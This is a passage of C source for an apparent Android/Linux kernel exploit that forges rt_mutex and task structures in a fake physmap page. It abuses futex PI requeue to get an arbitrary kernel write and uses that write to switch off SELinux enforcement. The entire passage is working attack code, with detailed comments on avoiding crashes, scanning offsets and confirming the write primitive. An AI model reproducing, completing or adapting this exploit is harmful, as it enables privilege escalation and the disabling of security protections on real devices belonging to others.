    __sync_synchronize();
    g_served = my;               /* publish: this batch is on the stack */
    while (g_ack != my) __asm__ __volatile__("yield" ::: "memory");
  }
  return NULL;
}

static void *owner_thread(void *arg) {
  (void)arg;
  pin_cpu(2);
  errno = 0;
  long tr = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  logf("[o] LOCK_PI(target) ret=%ld errno=%d\n", tr, tr ? errno : 0);
  atomic_store(&g_owner_started, 1);
  for (int i = 0; i < 3000 && !atomic_load(&g_waiter_ready); i++) usleep(1000);
  logf("[o] waiter_ready=%d, now contending for chain\n", atomic_load(&g_waiter_ready));
  errno = 0;
  long cr = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  logf("[o] LOCK_PI(chain) ret=%ld errno=%d\n", cr, cr ? errno : 0);
  atomic_store(&g_chain_done, 1);
  for (;;) pause();
}

static int selinux_enforcing(void) {
  int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (fd < 0) return -1;
  char b[4] = {0};
  int n = read(fd, b, sizeof(b));
  close(fd);
  if (n <= 0) return -1;
  return b[0] == '1';
}

static void build_fake_page(uint8_t *pg, uint64_t kb) {
  memset(pg, 0, 4096);
  uint64_t lock = kb + OFF_LOCK;
  uint64_t w0 = kb + OFF_W0;
  uint64_t task = kb + OFF_TASK;

  *(uint64_t *)(pg + OFF_LOCK + L_WAITERS) = w0 + W_TREE;
  *(uint64_t *)(pg + OFF_LOCK + L_WAITERS_LEFT) = w0 + W_TREE;
  /* * v12: leave owner deliberately NULL so the chain returns cleanly through [9]
   *   right after [7]:
   *     721 if (!rt_mutex_owner(lock)) {
   *     727     if (prerequeue_top_waiter != rt_mutex_top_waiter(lock))
   *     728         wake_up_process(rt_mutex_top_waiter(lock)->task);
   *     730     raw_spin_unlock_irq(&lock->wait_lock); return 0;   }
   *   Together with w0->prio = 0 (w0 is always leftmost/top), the comparison at
   *   727 is always equal, so even wake_up_process is not called (it would
   *   dereference a fake task).
   *   Benefit: the write-through point is inside [7] (before 721), while the whole
   *   [10]/[11]/[12] stretch (raw_spin_lock(fake_task->pi_lock) / dequeue_pi /
   *   enqueue_pi / rb_insert_color rotating on a fake pi_waiters) is skipped - and
   *   that stretch is exactly where the measured "silent hard lockup" came from. */
  *(uint64_t *)(pg + OFF_LOCK + L_OWNER) = 0;

  /* w0 carries two duties (verified instruction by instruction in disassembly):
   *   1) before [7], +0x01c8 unconditionally does `ldr x22,[lock+0x10]`
   *      (waiters_leftmost) and +0x01cc does `ldr x0,[x22,#0x38]` to read w->lock
   *      - so leftmost must be non-NULL and that "waiter"'s +0x38 must equal lock,
   *      otherwise it crashes on the spot.
   *   2) rt_mutex_dequeue_pi(task, w0) in [11] branch 1 must become a no-op.
   *
   * w0->tree_entry must be a **valid black root node**: pc = 1 (RB_BLACK + parent NULL).
   * With pc = 0 (red root) the following rt_mutex_enqueue's rb_insert_color would
   * compute gparent = 0 and dereference gparent->rb_right -> crash; pointing pc at
   * itself would create a self-cycle. */
  *(uint64_t *)(pg + OFF_W0 + W_TREE + 0x00) = 1;
  *(uint64_t *)(pg + OFF_W0 + W_TREE + 0x08) = 0;
  *(uint64_t *)(pg + OFF_W0 + W_TREE + 0x10) = 0;
  *(uint64_t *)(pg + OFF_W0 + W_TASK) = task;
  *(uint64_t *)(pg + OFF_W0 + W_LOCK) = lock;
  /* ** w0->prio must be **higher priority than task->prio** (numerically smaller),
   *   otherwise we fall into the fake red-black rotation of [11] branch 1.
   *   Derivation (source 705-770):
   *     [7] 707: waiter->prio = task->prio;   // task->prio = 120 on this chain
   *     708: rt_mutex_enqueue(lock, waiter)   // insert into the fake tree by prio
   *     739: if (waiter == rt_mutex_top_waiter(lock)) -> branch 1
   *   With w0->prio = 140 > 120, waiter becomes leftmost/top -> branch 1 ->
   *   rt_mutex_dequeue_pi/enqueue_pi do rb_erase/rb_insert_color on the fake
   *   pi_waiters, and that path holds task->pi_lock with interrupts off and spins
   *   forever (measured: silent hard lockup + watchdog reset, the kernel prints
   *   not a single byte).
   *   With 0 (highest priority) waiter(120) can never become top, 739/750 never
   *   hold, we take the empty else branch at 765, then 782 next_lock =
   *   fake_task->pi_blocked_on = 0, and 800 goto out_put_task returns cleanly.
   *   **The write-through point is in [7], before all of that, so it is unaffected.** */
  *(uint32_t *)(pg + OFF_W0 + W_PRIO) = 0;
  /* pi_tree = RB_EMPTY_NODE -> dequeue_pi returns at +0x0028 `cmp pc,&node` */
  *(uint64_t *)(pg + OFF_W0 + W_PI_TREE + 0x00) = w0 + W_PI_TREE; /* RB_CLEAR_NODE */
  *(uint64_t *)(pg + OFF_W0 + W_PI_TREE + 0x08) = 0;
  *(uint64_t *)(pg + OFF_W0 + W_PI_TREE + 0x10) = 0;

  *(uint32_t *)(pg + OFF_TASK + T_USAGE) = 0x100;
  *(uint32_t *)(pg + OFF_TASK + T_PRIO) = 120;
  *(uint32_t *)(pg + OFF_TASK + T_NORMAL_PRIO) = 120;
  *(uint32_t *)(pg + OFF_TASK + T_PI_LOCK) = 0;
  /* * pi_waiters must stay empty: with a non-zero rb_node, rt_mutex_enqueue_pi in
   *   [11] branch 1 would walk into this fake tree by prio, and the fake node's
   *   __rb_parent_color points at itself -> rb_insert_color self-cycles and hangs.
   *   Left empty, rb_link_node just writes the root and rb_insert_color(parent=NULL)
   *   stops immediately. */
  *(uint64_t *)(pg + OFF_TASK + T_PI_WAITERS) = 0;
  *(uint64_t *)(pg + OFF_TASK + T_PI_LEFTMOST) = 0;
  *(uint64_t *)(pg + OFF_TASK + T_PI_BLOCKED) = 0;

  /* ** the real write-through point: waiter->tree_entry of the sprayed waiter
   *   [7] rt_mutex_dequeue(lock, waiter) runs unconditionally:
   *       if (RB_EMPTY_NODE(&waiter->tree_entry)) return;
   *       rb_erase_cached(&waiter->tree_entry, &lock->waiters);
   *   We make pc = target-8 (!= &waiter->tree_entry, so the EMPTY_NODE early
   *   return is avoided, and low bit 0 = RB_RED), rb_left = 0 -> case 1,
   *   rb_right = 0 -> the value actually written (must be 0, or child is
   *   dereferenced).
   */
  v_pc     = g_target - 8;
  v_tree_r = 0;
  v_tree_l = 0;
  /* waiter->pi_tree is only re-initialised by rb_link_node inside [11]'s
   * rt_mutex_enqueue_pi() and is never erased before that, so 0 is fine. */
  v_pi_pc  = 0;
  v_pi_r   = 0;
  v_pi_l   = 0;
  v_task = task;
  v_lock = lock;
  v_prio = forced_prio ? forced_prio : 120;
  v_deadline = 0;
}

static uint64_t bootstrap(uint8_t *pg) {
  char req[64];
  snprintf(req, sizeof(req), "%d %llx\n", getpid(), (unsigned long long)pg);
  int wf = open("/sdcard/Download/g9_req.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (wf < 0) { logf("[!] failed to write req errno=%d\n", errno); return 0; }
  write(wf, req, strlen(req));
  close(wf);
  unlink("/sdcard/Download/g9_pfn.txt");
  logf("[*] req=%s", req);

  for (int i = 0; i < 600; i++) {
    int rf = open("/sdcard/Download/g9_pfn.txt", O_RDONLY);
    if (rf >= 0) {
      char b[64] = {0};
      int n = read(rf, b, sizeof(b) - 1);
      close(rf);
      if (n > 0) {
        unsigned long long pfn = strtoull(b, NULL, 16);
        if (pfn) {
          uint64_t phys = (pfn << 12) | ((uint64_t)pg & 0xfff);
          return PAGE_OFFSET + (phys - MEMSTART);
        }
      }
    }
    usleep(100000);
  }
  return 0;
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  pin_cpu(1);   /* main on CPU1: waiter on CPU0, owner on CPU2, no preemption between them */
  /* Argument parsing: --safe / --fp switches; first number = staged prio,
   * second = forced nice.
   * e.g. ghost24 139        -> staged prio=139, nice=19 (stage A self-proof)
   *      ghost24 120 19     -> staged prio=120, nice=19 (stage B, real chain)
   *      ghost24 --safe 120 -> fill the stack only, do not trigger */
  int np = 0;
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--safe") == 0) { safe_mode = 1; continue; }
    if (strcmp(argv[i], "--walk") == 0) { walk_mode = 1; continue; }
    if (strcmp(argv[i], "--scan") == 0) { scan_mode = 1; continue; }
    if (strcmp(argv[i], "--rounds") == 0 && i + 1 < argc) { g_rounds = strtol(argv[++i], NULL, 0); continue; }
    if (strcmp(argv[i], "--rdelay") == 0 && i + 1 < argc) { g_rdelay = (int)strtol(argv[++i], NULL, 0); continue; }
    if (strcmp(argv[i], "--wto") == 0 && i + 1 < argc) { g_wto_ms = (int)strtol(argv[++i], NULL, 0); continue; }
    if (strcmp(argv[i], "--prioonly") == 0) { g_prioonly = 1; scan_mode = 1; continue; }
    if (strcmp(argv[i], "--fill") == 0) { g_fill = 1; continue; }
    if (strcmp(argv[i], "--soft") == 0) { g_soft = 1; continue; }
    if (strcmp(argv[i], "--fillp") == 0 && i + 1 < argc) {
      g_fill = 1; g_fillprio = (int)strtol(argv[++i], NULL, 0); continue;
    }
    /* * --ucoff N: pin the spray base to N (hex or decimal).
     *   Used for the controlled experiment "is the geometry still aligned?":
     *   sabotage it by 8 bytes on purpose; if the gate still opens (crash), then
     *   pi_blocked_on is non-NULL and only the geometry drifted; if nothing at all
     *   happens, pi_blocked_on is NULL. */
    if (strcmp(argv[i], "--ucoff") == 0 && i + 1 < argc) {
      g_ucoff = (int)strtol(argv[++i], NULL, 0);
      continue;
    }
    if (strcmp(argv[i], "--fp") == 0) { fpcheck(); return 0; }
    char *end = NULL;
    long v = strtol(argv[i], &end, 0);
    if (end && *end == 0) {
      if (np == 0) forced_prio = (unsigned)v;
      else if (np == 1) forced_nice = (int)v;
      np++;
    }
  }
  logf("[*] ghost24 pid=%d safe=%d forced_prio=%u forced_nice=%d ucoff=%#x soft=%d\n", getpid(),
       safe_mode, forced_prio, forced_nice, g_ucoff, g_soft);

  /* first prove that the VFP copy really runs (zero risk, independent of the exploit) */
  fpcheck();

  g_target = A_SELINUX_ENFORCE;
  g_value = 0;

  uint8_t *pg = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (pg == MAP_FAILED) { logf("[!] mmap failed\n"); return 1; }
  mlock(pg, 4096);
  memset(pg, 0x41, 4096);

  uint64_t kb = bootstrap(pg);
  if (!kb) {
    /* Stage A (self-proof "did the spray hit waiter->prio") does not need the fake
     * page at all: equal prio returns early and task/lock are never read.
     * So keep running without a PFN, which keeps the number of stage-A variables
     * minimal. */
    logf("[!] no physmap address - degrading to stage A self-proof mode (task/lock=0)\n");
    kb = 0;
  } else {
    logf("[+] page physmap=%#llx\n", (unsigned long long)kb);
  }

  if (walk_mode) {
    /* ZERO-RISK self-proof: point the write at kb+0x800 inside our own page.
     *   waiter->tree_entry pc = (kb+0x800)-8 -> parent = kb+0x7f8
     *   parent->rb_left  = *(kb+0x808) = 0   != node  -> takes the rb_right branch
     *   parent->rb_right = *(kb+0x800) <= writes 0
     * Read it back from userspace, no kernel crash risk whatsoever.
     * * the sentinel must be written AFTER build_fake_page(), or its memset wipes it. */
    if (!kb) { logf("[!] --walk needs the physmap address, no PFN obtained\n"); return 3; }
    g_target = kb + 0x800;
  }
  /* --soft fills the window with the fake lock pointer (kb+OFF_LOCK): with kb=0
   * that becomes a small integer and the chain would dereference it and crash - so
   * give up instead of running blind when there is no PFN. */
  if (g_soft && !kb) { logf("[!] --soft needs the physmap address, no PFN obtained\n"); return 3; }

  build_fake_page(pg, kb);

  if (walk_mode) {
    memset(pg + 0x7f8, 0, 0x20);
    *(uint64_t *)(pg + 0x800) = 0xAAAAAAAAAAAAAAAAULL;
    *(uint64_t *)(pg + 0x808) = 0;
    logf("[walk] target=%#llx sentinel=0xAAAAAAAAAAAAAAAA\n",
         (unsigned long long)g_target);
    logf("[walk] criterion: read-back becomes 0 => write-through holds; still 0xAAAA.. => [7] did not run\n");
  }
  logf("[*] fake_lock=%#llx W0=%#llx fake_task=%#llx\n",
       (unsigned long long)(kb + OFF_LOCK),
       (unsigned long long)(kb + OFF_W0),
       (unsigned long long)(kb + OFF_TASK));
  logf("[*] staged: pc=%#llx task=%#llx lock=%#llx prio=%llu target=%#llx\n",
       (unsigned long long)v_pc, (unsigned long long)v_task,
       (unsigned long long)v_lock, (unsigned long long)v_prio,
       (unsigned long long)g_target);

  int before = selinux_enforcing();
  logf("[*] selinux before=%d\n", before);

  pthread_t w, o;
  int rc1 = pthread_create(&w, NULL, waiter_thread, NULL);
  int rc2 = pthread_create(&o, NULL, owner_thread, NULL);
  logf("[*] pthread_create rc=%d,%d\n", rc1, rc2);

  for (int i = 0; i < 3000; i++) {
    if (atomic_load(&g_waiter_waiting) && atomic_load(&g_owner_started)) break;
    usleep(1000);
  }
  logf("[*] ready waiter_waiting=%d owner_started=%d\n",
       atomic_load(&g_waiter_waiting), atomic_load(&g_owner_started));
  if (g_rdelay > 0) usleep((useconds_t)g_rdelay);

  /* * self-check (outside the critical section, does not disturb the spray):
   *   the waiter holds f_pi_chain at this point while the owner blocks on it
   *   (prio 120), so the waiter's effective priority is
   *   min(normal_prio, top_pi_waiter->prio) = min(?,120).
   *   Raising nice only lifts normal_prio; p->prio stays 120 - that is normal PI
   *   inheritance behaviour, not a broken sched_setattr. Using the main thread
   *   itself (no pi_waiters) as a control proves it. */
  {
    int t0 = atomic_load(&g_waiter_tid);
    int self = (int)syscall(SYS_gettid);
    int p0, n0, p1, n1, p2, n2, e1 = 0, e2 = 0;
    read_stat(t0, &p0, &n0);
    long r1 = do_nudge(t0, 10, &e1);
    read_stat(t0, &p1, &n1);
    long r2 = do_nudge(t0, 0, &e2);
    read_stat(t0, &p2, &n2);
    logf("[ctl] waiter tid=%d [prio=%d nice=%d] nice10(r=%ld e=%d)->[%d/%d] nice0(r=%ld e=%d)->[%d/%d]\n",
         t0, p0, n0, r1, e1, p1, n1, r2, e2, p2, n2);
    read_stat(self, &p0, &n0);
    do_nudge(self, 10, &e1);
    read_stat(self, &p1, &n1);
    do_nudge(self, 0, &e2);
    read_stat(self, &p2, &n2);
    logf("[ctl] self   tid=%d [prio=%d nice=%d] ->[%d/%d] ->[%d/%d]  (control: prio should change)\n",
         self, p0, n0, p1, n1, p2, n2);
  }

  errno = 0;
  long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  logf("[*] CMP_REQUEUE_PI ret=%ld errno=%d\n", rr, rr ? errno : 0);
  for (int i = 0; i < 30000 && !g_spray_ready; i++) usleep(1000);
  logf("[*] spray_ready=%d (%s)\n", g_spray_ready,
       g_spray_ready ? "waiter is in the request/response loop" : "waiter not ready");
  if (!g_spray_ready) { logf("[!] giving up: waiter stuck in futex\n"); return 2; }

  if (!safe_mode) {
    int tid = atomic_load(&g_waiter_tid);
    int nice = (forced_nice != -999) ? forced_nice : ((int)forced_prio - 120);
    if (nice < -20) nice = -20;
    if (nice > 19) nice = 19;
    int bmode = (nice != (int)forced_prio - 120);   /* staged prio != task->prio -> enters the chain */
    /* * walk is a zero-risk self-proof (at worst it clears one 8-byte word in our
     *   own page), so it can safely run hundreds of rounds until it hits.
     *   The real target also runs several rounds: each round first resets the fake
     *   page with build_fake_page() (if the previous round really went through
     *   [7]/[11], the fake waiters tree and fake_task->pi_waiters have been
     *   modified and cannot be reused), so rounds are idempotent - and writing 0
     *   to 0x590 is idempotent anyway. */
    /* * v13: under --fill the scan range widens to [0xF8, 0x1E8] (0xF0 stays the echo slot) */
    int scan_lo = UC_SCAN_LO;
    int scan_hi = g_fill ? 0x1E8 : UC_SCAN_HI;
    int scan_n  = (scan_hi - scan_lo) / 8 + 1;
    int rounds = g_rounds ? (int)g_rounds
                 : (g_prioonly ? scan_n * 300
                    : (scan_mode ? scan_n * (g_fill ? 300 : 800)
                                 : (walk_mode ? 4000 : 64)));
    logf("[*] trigger tid=%d nice=%d (staged prio=%u) %s rounds=%d\n", tid, nice,
         forced_prio,
         walk_mode ? "[walk self-proof]" : (bmode ? "[stage B: real chain]" : "[stage A]"),
         rounds);
    int done = 0, hit = 0, echo_ok = 0, echo_bad = 0;
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int round = 0; round < rounds; round++) {
      if (round > 0) {                            /* reset the fake page (outside the critical section) */
        build_fake_page(pg, kb);
        /* * build_fake_page starts with memset(pg,0,4096), which also clears the
         *   walk sentinel - it must be written back, or rd==0 is a false positive. */
        if (walk_mode) {
          memset(pg + 0x7f8, 0, 0x20);
          *(uint64_t *)(pg + 0x800) = 0xAAAAAAAAAAAAAAAAULL;
          *(uint64_t *)(pg + 0x808) = 0;
        }
      }
      /* * v11 scan: pick a different candidate base every round, rotating, so each
       *   offset gets tested several times.
       *   Must be set BEFORE requesting a spray - the handler reads g_ucoff from
       *   the waiter thread. */
      if (g_prioonly) {
        /* 300 consecutive rounds per candidate B (not rotating), so that after a
         * crash the last [B] line names the culprit */
        g_ucoff = scan_lo + (scan_n - 1 - ((round / 300) % scan_n)) * 8;
        g_skip_off = -1;
        if ((round % 300) == 0)
          logf("[B] ucoff=%#x (round %d, 300 rounds)\n", g_ucoff, round);
      } else if (scan_mode) {
        g_ucoff = scan_lo + (round % scan_n) * 8;
        /* * guard: for candidate B != 0x108, if some field would land on 0x148
         *   (waiter->prio), skip it. Otherwise that field would write a prio other
         *   than 120, the line-611 gate would open by accident, and a half-broken
         *   waiter would enter [7]/[11] -> panic. See the handler comment.
         *   Under --fill this guard is unnecessary (the fill value is 120 itself,
         *   inherently safe) and must be disabled, otherwise one field would be
         *   missing at the real base and the layout would be incomplete. */
        int d = 0x148 - g_ucoff;
        g_skip_off = (!g_fill && g_ucoff != UC_BASE_DEFAULT && d >= 0 && d <= 0x48) ? d : -1;
      }
      /* ================= critical section start ================= */
      g_seq = (uint32_t)(round + 1);
      __sync_synchronize();
      g_req = round + 1;
      while (g_served != g_req) __asm__ __volatile__("yield" ::: "memory");
      int err = 0;
      long ret = do_nudge(tid, nice, &err);      /* the only syscall inside the window */
      g_ack = g_req;
      /* ================= critical section end ================= */
      done = round + 1;
      /* * the criterion must look at all three: when [7]'s rb_erase takes case 1 it
       *   writes parent->rb_right (on our target) and does **not** change
       *   lock->waiters.rb_node; the following rt_mutex_enqueue attaches below the
       *   root w0 and only changes waiters_leftmost; [11] branch 1's enqueue_pi
       *   changes fake_task->pi_waiters.rb_node.
       *   Watching only rb_node would therefore miss hits. */
      uint64_t rb = *(uint64_t *)(pg + OFF_LOCK + L_WAITERS);
      uint64_t lm = *(uint64_t *)(pg + OFF_LOCK + L_WAITERS_LEFT);
      uint64_t pw = *(uint64_t *)(pg + OFF_TASK + T_PI_WAITERS);
      uint64_t base = kb + OFF_W0 + W_TREE;              /* the initial w0 */
      int entered7 = (rb != base) || (lm != base) || (pw != 0);
      int verbose = (round < 6) || ((round & 0xff) == 0xff);
      /* * echo interpretation: does d0 equal this round's ECHO_TAG|seq */
      {
        uint32_t want = ECHO_TAG | ((uint32_t)(round + 1) & 0xFFFFu);
        if ((uint32_t)g_echo == want) echo_ok++; else echo_bad++;
        if (verbose)
          logf("[echo] #%d d0=%#llx want=%#x -> %s\n", round,
               (unsigned long long)g_echo, want,
               ((uint32_t)g_echo == want) ? "copy happened OK" : "copy did not land NO");
      }
      if (verbose)
        logf("[*] nudge#%d uc=%#x h=%d ret=%ld errno=%d prio=%d rb=%#llx lm=%#llx pw=%#llx\n",
             round, g_ucoff, g_hcount, ret, err, read_prio(tid),
             (unsigned long long)rb, (unsigned long long)lm, (unsigned long long)pw);
      if (walk_mode) {
        uint64_t rd = *(uint64_t *)(pg + 0x800);
        if (rd == 0) {
          hit = 1;
          logf("[walk] ** write-through OK at round %d (g_ucoff=%#x): *(kb+0x800)=0 - [7]'s rb_erase really ran\n",
               round, g_ucoff);
          break;
        } else if (entered7) {
          hit = 2;
          logf("[walk] !! round %d: [7] ran but target unchanged (tree construction issue) uc=%#x rb_node=%#llx\n",
               round, g_ucoff, (unsigned long long)rb);
          break;
        } else if (verbose) {
          logf("[walk] round %d missed uc=%#x rd=%#llx rb=%#llx pc=%#llx\n", round,
               g_ucoff, (unsigned long long)rd, (unsigned long long)rb,
               (unsigned long long)v_pc);
        }
      } else {
        if (entered7) { hit = 1; logf("[+] round %d: chain entered [7] (rb_node=%#llx)\n",
                                     round, (unsigned long long)rb); }
        int now = selinux_enforcing();
        if (now == 0) {
          logf("[+] *** SELINUX OFF (round %d) - write-through to 0x590 succeeded\n", round);
          return 0;
        }
        if (hit) break;
        if (verbose) logf("[*] round %d did not enter the chain, retrying (reset fake page, re-spray)\n", round);
      }
      /* * walk mode must not use selinux as a criterion (before the real run it may
       *   already be 0), otherwise the self-proof experiment is cut short
       *   unconditionally at round 255. */
      if (!walk_mode && (round & 0xff) == 0xff) {
        int now = selinux_enforcing();
        logf("[*] round %d: selinux=%d\n", round, now);
        if (now == 0) { logf("[+] SELINUX OFF\n"); return 0; }
      }
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    {
      long ms = (t1.tv_sec - t0.tv_sec) * 1000L + (t1.tv_nsec - t0.tv_nsec) / 1000000L;
      logf("[*] elapsed %ld ms / %d rounds (%.1f us/round)\n", ms, done,
           done ? (double)ms * 1000.0 / (double)done : 0.0);
    }
    logf("[*] echo stats: copies landed %d / missed %d (of %d rounds)\n", echo_ok, echo_bad, done);
    if (walk_mode && hit == 1)
      logf("[walk] OK write primitive holds (hit within %d rounds) - safe to run against 0x590\n", done);
    else if (walk_mode)
      logf("[walk] XX all rounds missed: the spray still does not land on rt_waiter, or the chain is never entered\n", done);
    else if (hit)
      logf("[+] stage B: chain completed (selinux=%d)\n", selinux_enforcing());
    else
      logf("[!] %d rounds without entering the chain: spray all flushed?\n", done);
  }
  usleep(150000);
  logf("[*] selinux after=%d\n", selinux_enforcing());
  return 0;
}
